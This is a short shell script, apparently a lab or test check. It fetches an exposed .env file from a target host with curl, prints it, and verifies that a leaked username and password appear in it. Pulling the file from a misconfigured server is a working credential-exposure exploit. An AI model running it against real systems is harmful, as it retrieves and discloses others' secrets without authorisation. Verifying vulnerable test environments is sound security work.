#!/bin/sh
# Prove the exposed .env file leaks the credentials.
set -eu
body=$(curl -fsS http://${BOX_HOST}/.env)
echo "$body"
echo "$body" | grep -q "${BOX_LEAK_USER}" || { echo "leaked user missing" >&2; exit 1; }
echo "$body" | grep -q "${BOX_LEAK_PASS}" || { echo "leaked password missing" >&2; exit 1; }
